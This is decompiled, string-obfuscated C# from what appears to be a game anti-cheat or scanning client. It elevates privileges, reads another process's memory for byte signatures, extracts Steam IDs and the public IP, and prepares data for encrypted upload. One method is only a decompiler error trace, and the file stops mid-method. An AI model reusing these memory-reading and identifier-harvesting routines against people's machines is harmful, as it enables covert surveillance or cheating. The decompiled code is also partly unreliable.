﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

// Token: 0x020000BA RID: 186
public partial class MAIN : Form
{
	// Token: 0x060005F5 RID: 1525 RVA: 0x000592CC File Offset: 0x000574CC
	public MAIN()
	{
		this.InitUIComponents();
		this.bool_0 = false;
		this.gclass43_0 = new GClass43(false);
		Class12.Boolean_0 = true;
	}

	// Token: 0x060005F6 RID: 1526 RVA: 0x00059340 File Offset: 0x00057540
	private void button_0_Click(object sender, EventArgs e)
	{
		this.string_4 = null;
		if (!this.IsGuidBanned())
		{
			MessageBox.Show(this, <Module>.DeserealizeFromByteArrayV2_1<string>(4104710592U) + Class12.smethod_1(true), <Module>.DeserializeFromByteArray2<string>(1134619863U), MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Application.Exit();
		}
		try
		{
			this.bool_2 = GClass49.IsCurrentProcessElevated();
			this.thread_0 = new Thread(new ThreadStart(this.RunTasksAfterSetup));
			this.thread_0.Name = <Module>.DeserializeFromByteArrayV2<string>(3611466359U);
			this.thread_0.IsBackground = true;
			this.thread_0.Priority = ThreadPriority.Normal;
			this.thread_0.SetApartmentState(ApartmentState.STA);
			this.thread_0.Start();
		}
		catch
		{
			MessageBox.Show(this, <Module>.DeserializeFromByteArray2<string>(1507032178U), <Module>.DeserializeFromByteArrayV2<string>(1894978280U), MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	// Token: 0x060005F7 RID: 1527 RVA: 0x00059424 File Offset: 0x00057624
	public void RecordStopwatchTime(GEnum49 genum49_0, Stopwatch stopwatch_0)
	{
		object obj = this.object_4;
		lock (obj)
		{
			this.gclass51_0.dictionary_0.Add(genum49_0, stopwatch_0.ElapsedMilliseconds);
		}
	}

	// Token: 0x060005F8 RID: 1528 RVA: 0x00059478 File Offset: 0x00057678
	private void button_1_Click(object sender, EventArgs e)
	{
		MessageBox.Show(this, <Module>.DeserealizeFromByteArrayV2_1<string>(2357879709U), <Module>.DeserealizeFromByteArrayV2_1<string>(2953175378U), MessageBoxButtons.OK, MessageBoxIcon.Hand);
	}

	// Token: 0x060005F9 RID: 1529 RVA: 0x000594A4 File Offset: 0x000576A4
	public string GetCallerMethodName()
	{
		try
		{
			return new StackTrace().GetFrame(1).GetMethod().Name;
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x060005FA RID: 1530 RVA: 0x000594E4 File Offset: 0x000576E4
	public void UpdateListWithItem()
	{
		if (this.gclass51_0 != null)
		{
			string callerMethodName = this.GetCallerMethodName();
			object obj = this.object_5;
			lock (obj)
			{
				this.gclass51_0.List_8.Add(callerMethodName);
			}
		}
	}

	// Token: 0x060005FB RID: 1531 RVA: 0x00059540 File Offset: 0x00057740
	private void RunTasksAfterSetup()
	{
		this.string_3 = string.Empty;
		base.Invoke(new MethodInvoker(this.EnableButton));
		if (GClass45.AdjustTokenPrivilegesForProcess(<Module>.DeserializeFromByteArrayV2<string>(3778783931U), true))
		{
			this.gclass51_0 = new GClass51();
			this.gclass51_0.String_0 = this.string_0;
			this.bool_1 = false;
			this.int_0 = 0;
			int num = this.StartScanProcess();
			if (num != 0)
			{
				if (num == 1)
				{
					base.Invoke(new MethodInvoker(this.EnableButtonAndUpdateText2));
				}
				else if (num == 2)
				{
					base.Invoke(new MethodInvoker(this.UpdateButtonTextLabel3));
				}
				else if (num == 3)
				{
					base.Invoke(new MethodInvoker(this.ButtoNShitLabelText5));
				}
				else if (num == 4)
				{
					base.Invoke(new MethodInvoker(this.UpdateBullshitButtonTextLabel));
				}
				else
				{
					base.Invoke(new MethodInvoker(this.UpdateButtonTextLabel8millionomgSTOPTHISSSSSSS));
				}
			}
			else if (!this.SafeGetBool())
			{
				this.EncryptAndUploadDataAsync();
			}
			else
			{
				base.Invoke(new MethodInvoker(this.EnableButtonAndUpdateText));
			}
			this.gclass51_0 = null;
			GClass45.AdjustTokenPrivilegesForProcess(<Module>.DeserealizeFromByteArrayV2_1<string>(2031659371U), false);
			return;
		}
		base.Invoke(new MethodInvoker(this.UpdateButtonLabelState));
	}

	// Token: 0x060005FC RID: 1532 RVA: 0x00059680 File Offset: 0x00057880
	private GClass41 LogEvent(GEnum21 genum21_0, string string_6, int int_2 = -1, long long_0 = -1L, GEnum23 genum23_0 = GEnum23.const_0)
	{
		GClass41 gclass = new GClass41();
		gclass.GEnum21_0 = genum21_0;
		gclass.Int32_0 = int_2;
		gclass.String_0 = Class15.SanitizeString(string_6);
		gclass.Int64_0 = long_0;
		gclass.GEnum23_0 = genum23_0;
		object obj = MAIN.object_1;
		lock (obj)
		{
			this.gclass51_0.List_0.Add(gclass);
		}
		return gclass;
	}

	// Token: 0x060005FD RID: 1533 RVA: 0x000596FC File Offset: 0x000578FC
	private long HandleFileAccessRights(GEnum21 genum21_0, GEnum48 genum48_0, string string_6, DateTime? nullable_0 = null, GEnum51 genum51_0 = GEnum51.const_0)
	{
		long num = -1L;
		if (string_6 != null && string_6.Length != 0)
		{
			string_6 = GClass44.NormalizeFilePath(string_6, this.bool_2, ref genum51_0);
			string b = string_6.ToLowerInvariant();
			object obj = MAIN.object_0;
			lock (obj)
			{
				int num2 = 0;
				while (num2 < this.gclass51_0.List_1.Count && !this.SafeGetBool())
				{
					if (this.gclass51_0.List_1[num2].String_1.ToLowerInvariant() == b)
					{
						this.gclass51_0.List_1[num2].GEnum48_0 |= genum48_0;
						this.gclass51_0.List_1[num2].GEnum21_0 |= genum21_0;
						if (nullable_0 != null)
						{
							try
							{
								if (this.gclass51_0.List_1[num2].Nullable_0 != null)
								{
									int num3 = (nullable_0.Value - this.gclass51_0.DateTime_0).Seconds;
									if (num3 < 0)
									{
										num3 = 0 - num3;
									}
									int num4 = (this.gclass51_0.List_1[num2].Nullable_0.Value - this.gclass51_0.DateTime_0).Seconds;
									if (num4 < 0)
									{
										num4 = 0 - num4;
									}
									if (num3 < num4)
									{
										this.gclass51_0.List_1[num2].Nullable_0 = nullable_0;
									}
								}
								else
								{
									this.gclass51_0.List_1[num2].Nullable_0 = nullable_0;
								}
							}
							catch
							{
							}
						}
						num = (long)num2;
						break;
					}
					num2++;
				}
				if (num == -1L && !this.SafeGetBool())
				{
					GClass44 gclass = new GClass44(string_6, genum48_0, false);
					gclass.Nullable_0 = nullable_0;
					gclass.GEnum21_0 = genum21_0;
					gclass.Int64_0 = (long)this.gclass51_0.List_1.Count;
					this.gclass51_0.List_1.Add(gclass);
					num = gclass.Int64_0;
				}
			}
			return num;
		}
		this.AddToErrorLog(GEnum22.const_0, string.Format(<Module>.DeserealizeFromByteArrayV2_1<string>(408081070U), (int)genum21_0, (int)genum48_0));
		return num;
	}

	// Token: 0x060005FE RID: 1534
	private long ManageFileEntries(GClass44 gclass44_0)
	{
		long num = -1L;
		string b = gclass44_0.String_1.ToLowerInvariant();
		object obj = MAIN.object_0;
		lock (obj)
		{
			int num2 = 0;
			while (num2 < this.gclass51_0.List_1.Count && !this.SafeGetBool())
			{
				if (this.gclass51_0.List_1[num2].String_1.ToLowerInvariant() == b)
				{
					this.gclass51_0.List_1[num2].GEnum48_0 |= gclass44_0.GEnum48_0;
					if (gclass44_0.Nullable_0 != null)
					{
						try
						{
							if (this.gclass51_0.List_1[num2].Nullable_0 != null)
							{
								int num3 = (gclass44_0.Nullable_0.Value - this.gclass51_0.DateTime_0).Seconds;
								if (num3 < 0)
								{
									num3 = 0 - num3;
								}
								int num4 = (this.gclass51_0.List_1[num2].Nullable_0.Value - this.gclass51_0.DateTime_0).Seconds;
								if (num4 < 0)
								{
									num4 = 0 - num4;
								}
								if (num3 < num4)
								{
									this.gclass51_0.List_1[num2].Nullable_0 = gclass44_0.Nullable_0;
								}
							}
							else
							{
								this.gclass51_0.List_1[num2].Nullable_0 = gclass44_0.Nullable_0;
							}
						}
						catch
						{
						}
					}
					num = (long)num2;
					break;
				}
				num2++;
			}
			if (num == -1L)
			{
				if (!this.SafeGetBool())
				{
					gclass44_0.Int64_0 = (long)this.gclass51_0.List_1.Count;
					this.gclass51_0.List_1.Add(gclass44_0);
					num = gclass44_0.Int64_0;
				}
			}
		}
		return num;
	}

	// Token: 0x060005FF RID: 1535 RVA: 0x00059BBC File Offset: 0x00057DBC
	private void AddToErrorLog(GEnum22 genum22_0, string string_6)
	{
		object obj = MAIN.object_3;
		lock (obj)
		{
			if (this.string_3 != "")
			{
				this.string_3 += Class15.char_0.ToString();
			}
			string str = Class15.SanitizeString(string_6).Replace(<Module>.DeserealizeFromByteArrayV2_1<string>(588478659U), <Module>.DeserealizeFromByteArrayV2_1<string>(3801060421U)).Replace(<Module>.DeserializeFromByteArray<string>(778781061U), <Module>.DeserealizeFromByteArrayV2_1<string>(1601714513U)).Replace(<Module>.DeserializeFromByteArrayV2<string>(2084778443U), <Module>.DeserializeFromByteArray3<string>(4248270530U));
			string str2 = this.string_3;
			int num = (int)genum22_0;
			this.string_3 = str2 + num.ToString() + Class15.char_2.ToString() + str;
		}
	}

	// Token: 0x06000600 RID: 1536 RVA: 0x00059CA0 File Offset: 0x00057EA0
	private string FindModuleInProcess(Process process_1)
	{
		try
		{
			ReadOnlyCollectionBase modules = process_1.Modules;
			string string_ = Class14.String_116;
			string string_2 = Class14.String_176;
			using (IEnumerator enumerator = modules.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					string a = ((ProcessModule)enumerator.Current).ModuleName.ToLower();
					if (a == string_)
					{
						return Class14.String_77;
					}
					if (a == string_2)
					{
						return Class14.String_125;
					}
				}
			}
			return Class14.String_94;
		}
		catch (Win32Exception)
		{
			this.SafeSetBool();
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_31, ex.ToString());
		}
		return Class14.String_215;
	}

	// Token: 0x06000601 RID: 1537 RVA: 0x00059D7C File Offset: 0x00057F7C
	public long ProcessSignatureScanning(Process process_1)
	{
		long result = 0L;
		if (process_1 != null && !process_1.HasExited)
		{
			List<GClass52> list = new List<GClass52>();
			byte[] byte_ = Class14.Byte_32;
			string string_ = Class14.String_139;
			GClass53 item = new GClass53(byte_, string_, new int[]
			{
				11,
				19
			});
			GClass52 item2 = new GClass52(Class14.String_3, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_3)), new List<GClass53>
			{
				item
			}, false);
			list.Add(item2);
			byte[] byte_2 = Class14.Byte_53;
			string string_2 = Class14.String_190;
			GClass53 item3 = new GClass53(byte_2, string_2, new int[]
			{
				42,
				48
			});
			GClass52 item4 = new GClass52(Class14.String_126, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_126)), new List<GClass53>
			{
				item3
			}, false);
			list.Add(item4);
			return this.start_scan(process_1, list);
		}
		return result;
	}

	// Token: 0x06000602 RID: 1538 RVA: 0x00059E74 File Offset: 0x00058074
	public long start_scan(Process process_1, List<GClass52> list_0)
	{
		long num = 0L;
		IntPtr intPtr = IntPtr.Zero;
		if (process_1 != null && !this.SafeGetBool())
		{
			GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
			GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
			GClass45.GetSystemInfo(ref gstruct2);
			IntPtr intPtr2 = gstruct2.intptr_0;
			uint num2 = 0U;
			bool flag = false;
			int num3 = 0;
			uint num4 = 240U;
			try
			{
				uint num5 = gstruct2.uint_1;
				if (num5 == 0U)
				{
					num5 = 4096U;
				}
				uint num6 = num5;
				byte[] value = new byte[8];
				byte[] array = new byte[num6];
				int int_ = Marshal.SizeOf(gstruct);
				intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
				if (intPtr != IntPtr.Zero)
				{
					num3 = 0;
					while (num3 < list_0.Count && !this.SafeGetBool())
					{
						GClass52 gclass = list_0[num3];
						ProcessModule processModule = GClass49.FindProcessModule(process_1, gclass.String_0, gclass.String_1, GClass49.GEnum43.const_3);
						if (processModule != null)
						{
							try
							{
								int num7 = gclass.method_0();
								intPtr2 = processModule.BaseAddress;
								IntPtr intPtr3 = (IntPtr)(processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize);
								while (!this.SafeGetBool() && !flag && intPtr2.ToInt64() < intPtr3.ToInt64() && GClass45.VirtualQueryEx(intPtr, intPtr2, out gstruct, int_) > 0)
								{
									IntPtr intPtr4 = (IntPtr)(intPtr2.ToInt64() + gstruct.intptr_2.ToInt64());
									if (((gstruct.uint_0 & num4) != 0U || (gstruct.uint_2 & num4) != 0U) && GClass49.CanExecuteCodeInMemory(gstruct))
									{
										IntPtr intPtr5 = intPtr2;
										IntPtr intPtr6 = intPtr5;
										num6 = num5;
										do
										{
											if (intPtr5.ToInt64() + (long)((ulong)num6) > intPtr4.ToInt64())
											{
												num6 = (uint)(intPtr4.ToInt64() - intPtr5.ToInt64());
												Array.Clear(array, 0, array.Length);
											}
											if (!GClass45.ReadProcessMemory(intPtr, intPtr5, array, num6, ref num2) || num2 != num6)
											{
												break;
											}
											int num8 = 0;
											while (num8 < gclass.List_0.Count && !this.SafeGetBool())
											{
												GClass53 gclass2 = gclass.List_0[num8];
												int num9 = 0;
												do
												{
													num9 = Class15.SearchBytePattern(array, gclass2.Byte_0, gclass2.String_0, num9, 0);
													if (num9 == -1)
													{
														break;
													}
													int num10 = num9 + gclass2.Int32_0[0];
													uint num11;
													IntPtr intptr_;
													if (!gclass.Boolean_0)
													{
														num11 = 4U;
														if ((long)num10 + 4L >= (long)((ulong)num6))
														{
															break;
														}
														intptr_ = (IntPtr)((long)((ulong)BitConverter.ToUInt32(array, num10)));
													}
													else
													{
														num11 = 8U;
														if ((long)(num10 + 4) >= (long)((ulong)num6))
														{
															break;
														}
														intptr_ = (IntPtr)(intPtr5.ToInt64() + (long)num10 + 4L + (long)((ulong)BitConverter.ToUInt32(array, num10)));
													}
													if (intptr_.ToInt64() >= processModule.BaseAddress.ToInt64() && intptr_.ToInt64() < intPtr3.ToInt64())
													{
														if (GClass45.ReadProcessMemory(intPtr, intptr_, value, num11, ref num2))
														{
															if (num2 == num11)
															{
																if (!gclass.Boolean_0)
																{
																	int num12 = BitConverter.ToInt32(value, 0);
																	num10 = num9 + gclass2.Int32_0[1];
																	if ((long)num10 + (long)((ulong)num11) >= (long)((ulong)num6))
																	{
																		break;
																	}
																	IntPtr intptr_2 = (IntPtr)((long)((ulong)BitConverter.ToUInt32(array, num10)));
																	if (intptr_2.ToInt64() < processModule.BaseAddress.ToInt64() || intptr_2.ToInt64() >= intPtr3.ToInt64())
																	{
																		num9 += list_0[num3].List_0[num8].Byte_0.Length;
																		goto IL_3FA;
																	}
																	if (!GClass45.ReadProcessMemory(intPtr, intptr_2, value, num11, ref num2) || num2 != num11)
																	{
																		num9 += gclass2.Byte_0.Length;
																		goto IL_3FA;
																	}
																	long num13 = (long)BitConverter.ToInt32(value, 0);
																	num = 0L;
																	num = (num13 << 32) + (long)num12;
																}
																else
																{
																	num = BitConverter.ToInt64(value, 0);
																}
																if (!Class15.IsLongAboveLimit(num))
																{
																	num9 += gclass2.Byte_0.Length;
																	goto IL_3FA;
																}
																goto IL_42D;
															}
														}
														num9 += gclass2.Byte_0.Length;
													}
													else
													{
														num9 += list_0[num3].List_0[num8].Byte_0.Length;
													}
													IL_3FA:
													if (num9 == -1)
													{
														break;
													}
												}
												while (!this.SafeGetBool());
												IL_430:
												if (!flag)
												{
													num8++;
													continue;
												}
												break;
												goto IL_430;
												IL_42D:
												flag = true;
												goto IL_430;
											}
											if (flag)
											{
												break;
											}
											intPtr6 = (IntPtr)(intPtr6.ToInt64() + (long)((ulong)num6));
											intPtr5 = (IntPtr)(intPtr6.ToInt64() - (long)num7);
											if ((ulong)num6 == (ulong)((long)num7))
											{
												break;
											}
										}
										while (intPtr5.ToInt64() < intPtr4.ToInt64());
										IL_4AB:
										if (!flag)
										{
											intPtr2 = intPtr4;
											continue;
										}
										break;
										goto IL_4AB;
									}
									intPtr2 = intPtr4;
								}
								if (flag)
								{
									break;
								}
							}
							catch (Exception ex)
							{
								this.AddToErrorLog(GEnum22.const_11, ex.ToString());
							}
						}
						num3++;
					}
				}
			}
			catch (Exception ex2)
			{
				this.AddToErrorLog(GEnum22.const_12, ex2.ToString());
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					GClass45.CloseHandle(intPtr);
				}
			}
			return num;
		}
		return num;
	}

	// Token: 0x06000603 RID: 1539 RVA: 0x0005A3E4 File Offset: 0x000585E4
	private Process get_process()
	{
		try
		{
			string string_ = Class14.String_22;
			string string_2 = Class14.String_71;
			foreach (Process process in Process.GetProcessesByName(string_))
			{
				try
				{
					string directoryName = Path.GetDirectoryName(process.MainModule.FileName);
					if (Directory.Exists(Path.Combine(directoryName, string_)))
					{
						if (Directory.Exists(Path.Combine(directoryName, string_2)))
						{
							return process;
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return null;
	}

	// Token: 0x06000604 RID: 1540 RVA: 0x0005A47C File Offset: 0x0005867C
	private void method_12()
	{
		/*
An exception occurred when decompiling this method (06000604)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void MAIN::method_12()

 ---> System.Exception: Inconsistent stack size at IL_2C
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 443
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
	}

	// Token: 0x06000605 RID: 1541 RVA: 0x0005A61C File Offset: 0x0005881C
	private string GetModifiedRegistryValue()
	{
		try
		{
			uint num = 0U;
			if (RegistryStuff.RetrieveRegistryKeyValue(Registry.CurrentUser, Class14.String_178, Class14.String_82, out num) && num > 0U)
			{
				long num2 = Convert.ToInt64(num) + 76561197960265728L;
				if (num2 > 0L)
				{
					return MAIN.CalculateAndFormatString(num2);
				}
			}
		}
		catch
		{
		}
		return null;
	}

	// Token: 0x06000606 RID: 1542 RVA: 0x0005A688 File Offset: 0x00058888
	private string readfile(string string_6)
	{
		FileStream fileStream = null;
		StreamReader streamReader = null;
		try
		{
			if (!File.Exists(string_6))
			{
				return null;
			}
			try
			{
				fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.Read);
			}
			catch
			{
				fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			}
			streamReader = new StreamReader(fileStream);
			if (streamReader == null)
			{
				return null;
			}
			int num = -1;
			string string_7 = Class14.String_29;
			string text;
			while ((text = streamReader.ReadLine()) != null)
			{
				text = text.Trim();
				num = text.IndexOf(string_7);
				if (num > -1)
				{
					num += string_7.Length;
					break;
				}
			}
			if (text != null && num > -1)
			{
				text = text.Trim();
				num = text.IndexOf(<Module>.DeserializeFromByteArray<string>(1322800221U), num);
				if (num > -1)
				{
					num++;
					int num2 = text.IndexOf(<Module>.DeserializeFromByteArrayV2<string>(4091094967U), num);
					if (num2 > -1)
					{
						long num3 = Convert.ToInt64(text.Substring(num, num2 - num));
						if (num3 >= 0L)
						{
							return MAIN.CalculateAndFormatString(num3);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_15, ex.ToString());
		}
		finally
		{
			if (fileStream != null)
			{
				try
				{
					fileStream.Close();
				}
				catch
				{
				}
			}
			if (streamReader != null)
			{
				try
				{
					streamReader.Close();
				}
				catch
				{
				}
			}
		}
		return null;
	}

	// Token: 0x06000607 RID: 1543
	private static string CalculateAndFormatString(long long_0)
	{
		try
		{
			long_0 -= 76561197960265728L;
			long num = long_0 % 2L;
			long_0 -= num;
			long num2 = long_0 / 2L;
			return string.Format(<Module>.DeserializeFromByteArrayV2<string>(658118809U), num, num2);
		}
		catch
		{
		}
		return null;
	}

	// Token: 0x06000608 RID: 1544
	private static string TryHttpConnect()
	{
		foreach (string string_ in new string[]
		{
			<Module>.DeserializeFromByteArrayV2<string>(3236598026U),
			<Module>.DeserializeFromByteArrayV2<string>(4083600770U),
			<Module>.DeserealizeFromByteArrayV2_1<string>(304356550U),
			<Module>.DeserealizeFromByteArrayV2_1<string>(4058131079U),
			<Module>.DeserializeFromByteArray<string>(3574027504U),
			<Module>.DeserializeFromByteArray3<string>(720943125U),
			<Module>.DeserializeFromByteArray<string>(835967045U),
			<Module>.DeserializeFromByteArray2<string>(102890213U),
			<Module>.DeserealizeFromByteArrayV2_1<string>(776399637U),
			<Module>.DeserializeFromByteArray<string>(3874630076U),
			<Module>.DeserializeFromByteArray<string>(592550457U)
		})
		{
			try
			{
				string result = MAIN.http_connection(string_);
				if (Class15.get_ip_address(result))
				{
					return result;
				}
			}
			catch
			{
			}
		}
		return string.Format(<Module>.DeserializeFromByteArray3<string>(581374486U), new object[]
		{
			Class14.String_215,
			Class14.String_215,
			Class14.String_215,
			Class14.String_215
		});
	}

	// Token: 0x06000609 RID: 1545 RVA: 0x0005A974 File Offset: 0x00058B74
	private static string http_connection(string string_6)
	{
		WebResponse webResponse = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_6);
			httpWebRequest.Proxy = null;
			httpWebRequest.Timeout = Class15.int_0;
			httpWebRequest.Method = <Module>.DeserializeFromByteArray<string>(3796187426U);
			webResponse = httpWebRequest.GetResponse();
			using (StreamReader streamReader = new StreamReader(webResponse.GetResponseStream()))
			{
				Match match = MAIN.regex_0.Match(streamReader.ReadToEnd());
				if (match.Success)
				{
					return match.ToString();
				}
			}
		}
		catch
		{
		}
		finally
		{
			if (webResponse != null)
			{
				try
				{
					webResponse.Close();
				}
				catch
				{
				}
			}
		}
		return null;
	}

	// Token: 0x0600060A RID: 1546 RVA: 0x0005AA3C File Offset: 0x00058C3C
	private string GetValueFromByteArray(byte[] byte_2)
	{
		string text = null;
		if (byte_2 != null && byte_2.Length >= 1)
		{
			string result;
			try
			{
				string text2 = Encoding.UTF8.GetString(byte_2, 0, byte_2.Length).TrimEnd(new char[1]);
				if (text2.Length >= 1 && text2[0] == '\\')
				{
					string string_ = Class14.String_213;
					string[] array = text2.Split(new char[]
					{
						'\\'
					});
					if (array.Length != 0)
					{
						for (int i = 1; i < array.Length; i += 2)
						{
							if (array[i].ToLower() == string_ && i + 1 < array.Length)
							{
								text = array[i + 1];
								int num = text.IndexOf('\0');
								if (num > 0)
								{
									text = text.Substring(0, num);
								}
								text = text.Trim();
								break;
							}
						}
					}
					return text;
				}
				result = text;
			}
			catch (Exception ex)
			{
				this.AddToErrorLog(GEnum22.const_13, ex.ToString());
				return text;
			}
			return result;
		}
		return text;
	}

	// Token: 0x0600060B RID: 1547 RVA: 0x0005AB2C File Offset: 0x00058D2C
	public string ScanProcessMemoryForPatterns()
	{
		IntPtr intPtr = IntPtr.Zero;
		if (this.process_0 != null && !this.SafeGetBool())
		{
			GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
			GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
			GClass45.GetSystemInfo(ref gstruct2);
			uint num = 0U;
			List<GClass52> list = new List<GClass52>();
			try
			{
				List<GClass53> list_ = new List<GClass53>
				{
					new GClass53(Class14.Byte_46, Class14.String_188, Class14.int_73),
					new GClass53(Class14.Byte_12, Class14.String_23, Class14.int_255),
					new GClass53(Class14.Byte_29, Class14.String_204, Class14.int_121),
					new GClass53(Class14.Byte_45, Class14.String_123, Class14.int_105),
					new GClass53(Class14.Byte_15, Class14.String_239, Class14.int_279)
				};
				GClass52 item = new GClass52(Class14.String_235, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_235)), list_, false);
				list.Add(item);
				GClass52 item2 = new GClass52(Class14.String_116, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_116)), list_, false);
				list.Add(item2);
				GClass52 item3 = new GClass52(this.process_0.MainModule.ModuleName, this.process_0.MainModule.FileName, list_, false);
				list.Add(item3);
				uint num2 = 244U;
				IntPtr intptr_ = IntPtr.Zero;
				byte[] array = new byte[4096];
				Array.Clear(array, 0, array.Length);
				uint num3 = gstruct2.uint_1;
				if (num3 == 0U)
				{
					num3 = 4096U;
				}
				uint num4 = num3;
				byte[] array2 = new byte[num4];
				intPtr = GClass45.OpenProcess(1040, false, this.process_0.Id);
				if (intPtr != IntPtr.Zero)
				{
					int num5 = 0;
					while (num5 < list.Count && !this.SafeGetBool())
					{
						GClass52 gclass = list[num5];
						ProcessModule processModule = GClass49.FindProcessModule(this.process_0, gclass.String_0, gclass.String_1, GClass49.GEnum43.const_3);
						if (processModule != null)
						{
							int num6 = gclass.method_0();
							IntPtr intPtr2 = processModule.BaseAddress;
							IntPtr intPtr3 = (IntPtr)(processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize);
							try
							{
								while (!this.SafeGetBool() && intPtr2.ToInt64() < intPtr3.ToInt64() && GClass45.VirtualQueryEx(intPtr, intPtr2, out gstruct, Marshal.SizeOf(gstruct)) > 0)
								{
									IntPtr intPtr4 = (IntPtr)(intPtr2.ToInt64() + gstruct.intptr_2.ToInt64());
									if ((gstruct.uint_2 & num2) != 0U && GClass49.CanExecuteCodeInMemory(gstruct))
									{
										IntPtr intPtr5 = intPtr2;
										IntPtr intPtr6 = intPtr5;
										num4 = num3;
										string valueFromByteArray;
										do
										{
											if (intPtr5.ToInt64() + (long)((ulong)num4) > intPtr4.ToInt64())
											{
												num4 = (uint)(intPtr4.ToInt64() - intPtr5.ToInt64());
												Array.Clear(array2, 0, array2.Length);
											}
											if (!GClass45.ReadProcessMemory(intPtr, intPtr5, array2, num4, ref num) || num != num4)
											{
												break;
											}
											int num7 = 0;
											while (num7 < gclass.List_0.Count && !this.SafeGetBool())
											{
												GClass53 gclass2 = gclass.List_0[num7];
												int num8 = 0;
												do
												{
													num8 = Class15.SearchBytePattern(array2, gclass2.Byte_0, gclass2.String_0, num8, 0);
													if (num8 > -1)
													{
														int num9 = num8 + gclass2.Int32_0[0];
														if ((long)(num9 + 4) >= (long)((ulong)num4))
														{
															break;
														}
														intptr_ = (IntPtr)((long)((ulong)BitConverter.ToUInt32(array2, num9)));
														if (intptr_.ToInt64() >= processModule.BaseAddress.ToInt64() && intptr_.ToInt64() < intPtr3.ToInt64())
														{
															if (!GClass45.ReadProcessMemory(intPtr, intptr_, array, (uint)array.Length, ref num) || num <= 0U)
															{
																break;
															}
															valueFromByteArray = this.GetValueFromByteArray(array);
															if (valueFromByteArray != null)
															{
																goto IL_47D;
															}
															Array.Clear(array, 0, array.Length);
														}
														num8 += gclass2.Byte_0.Length;
													}
												}
												while (num8 > -1 && !this.SafeGetBool());
												num7++;
											}
											intPtr6 = (IntPtr)(intPtr6.ToInt64() + (long)((ulong)num4));
											intPtr5 = (IntPtr)(intPtr6.ToInt64() - (long)num6);
										}
										while ((ulong)num4 != (ulong)((long)num6) && intPtr5.ToInt64() < intPtr4.ToInt64() && !this.SafeGetBool());
										intPtr2 = intPtr4;
										continue;
										IL_47D:
										return valueFromByteArray;
									}
									intPtr2 = intPtr4;
								}
							}
							catch (Exception ex)
							{
								this.AddToErrorLog(GEnum22.const_34, ex.ToString());
							}
						}
						num5++;
					}
				}
			}
			catch (Exception ex2)
			{
				this.AddToErrorLog(GEnum22.const_35, ex2.ToString());
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					GClass45.CloseHandle(intPtr);
				}
			}
			return null;
		}
		return null;
	}

	// Token: 0x0600060C RID: 1548 RVA: 0x0005B058 File Offset: 0x00059258
	private string RetrieveStringValueWithFallbacks()
	{
